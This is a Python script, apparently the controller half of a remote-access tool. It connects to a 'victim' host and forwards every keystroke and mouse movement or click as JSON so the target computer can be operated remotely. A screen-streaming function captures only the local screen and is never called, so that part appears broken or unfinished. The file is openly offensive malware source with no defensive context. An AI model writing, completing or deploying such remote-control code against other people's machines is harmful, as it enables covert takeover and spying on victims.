import socket
import json
from pynput import keyboard, mouse
import cv2
import numpy as np
from PIL import ImageGrab


def connect_to_victim(server_host, server_port):
    global client
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP/IPv4 socket
    client.connect((server_host, server_port))
    print(f"Connected to {server_host}: {server_port}")

def send(msg):
    client.send((json.dumps(msg) + "\n").encode())

def screen_stream():
    print("Starting screen stream... Press ' | ' to stop.")

    while True:
        img = ImageGrab.grab()   #screenshot of the whole screen
    
        frame = np.array(img)   #NumPy array
        
        frame_bgr = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)   #RGB color to OpenCV BGR color
        
        cv2.imshow("Live Screen Stream", frame_bgr)    #Show in OpenCV window
        
        if cv2.waitKey(1) & 0xFF == ord('|'):    #Stop the stream if the user presses the '|' key
            break

    # Clean up and close all windows
    cv2.destroyAllWindows()

    
def on_press(key):
    try:
        send({"type": "key", "key": key.char, "action": "down"})
    except:
        send({"type": "key", "key": str(key), "action": "down"})

def on_release(key):
    try:
        send({"type": "key", "key": key.char, "action": "up"})
    except:
        send({"type": "key", "key": str(key), "action": "up"})

def on_move(x, y):
        send({"type": "mouse_move", "x": x, "y": y})

def on_click(x, y, button, pressed):
    send({"type": "mouse_click", "button": str(button), "action": "down" if pressed else "up", "x": x, "y": y})


server_host = '192.168.1.181'
server_port = 8000
connect_to_victim(server_host, server_port)

keyboard.Listener(on_press=on_press, on_release=on_release).start()
mouse.Listener(on_move=on_move, on_click=on_click).start()

